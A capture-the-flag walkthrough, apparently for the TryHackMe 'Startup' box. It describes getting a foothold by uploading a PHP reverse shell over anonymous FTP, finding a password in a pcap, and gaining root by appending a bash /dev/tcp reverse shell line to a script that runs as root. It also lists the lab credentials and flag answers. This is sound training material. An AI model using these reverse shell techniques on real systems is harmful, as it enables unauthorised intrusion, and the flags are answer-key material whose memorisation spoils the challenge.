## IP=10.10.83.33


# Startup #

### Approach:
	
1. NMAP scan:
	* FTP (21) - vsftpd 3.0.4
	* SSH (22) - OpenSSH 7.2p
	* HTTP (80) - Apache 2.4.18

2. `http://$IP/files/notice.txt`
	* Yielded a potential username, `Maya`

3. Checking out the FTP server using `anonymous`.
	* Validated that I can put files on the server.

4. Create reverse shell and upload it via FTP.
	* Created a php reverse shell named `sus.php` and uploaded to the ftp server with `put sus.php`.
	* Started local netcat listener.
	* Once successfully uploaded, in my browser, navigated to `http://10.10.232.155/files/ftp/sus.php`.

5. Answer to question one is in `/recipe.txt`.

6. Uploaded and ran `linpeas.sh` on the victim machine.
	* User with console: `vagrant`
	* Unexpected folders in root: `/vagrant` + `/incidents`

7. Checking in on the folder, `/incidents`, there is a file, `suspicious.pcapng`. Its a pcap file so it contains network transaction data that we can look at in wireshark. So, I downloaded the pcap file onto my local machine and opened it in wireshark.
	* Found that the IP address, `192.168.22.139`, had attempted a netcat connection and was popping up a lot so I decided to apply the filter: `ip.src == 192.168.22.139` to view just that IP's traffic.
	* I then went through the line items until I came across something that caught my eye. When something did, I'd right-click, then select Follow > TCP Stream (or whatever stream was available). I did this a few times until I came across a stream that contained what looked to be linux commands. I followed through the commands and came across a potentical password.
	* I tried the password for the user, `lennie`, and sure enough it worked! See next step for user details.

8. Answer to user flag is located at `/home/lennie/user.txt`.
	* Can SSH using:
		* Username: `lennie`
		* Password: `c4ntg3t3n0ughsp1c3`

9. Saw that the script, `/home/lennie/scripts/planner.sh`, made a call to another script, `/etc/print.sh`, as root. As the user, `lennie`, I wasn't able to edit `planner.sh`, but I was able to edit `print.sh`. The script was a bash script so I looked up on GTFOBins a bash reverse shell script...
	* On my machine, I ran: `nc -lnvp 5555`
	* On the box, I added the following line to `print.sh`: `bash -c 'exec bash -i &>/dev/tcp/<MY IP>/5555 <&1'`
	* I waited about a minute and BOOM I had a reverse shell as root.

10. Answer to root flag is located at `/root/root.txt`.


### Questions:

1. What is the secret spicy soup recipe?

```
love
```

2. What is the user flag?

```
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

3. What is the root flag?

```
THM{f963aaa6a430f210222158ae15c3d76d}
```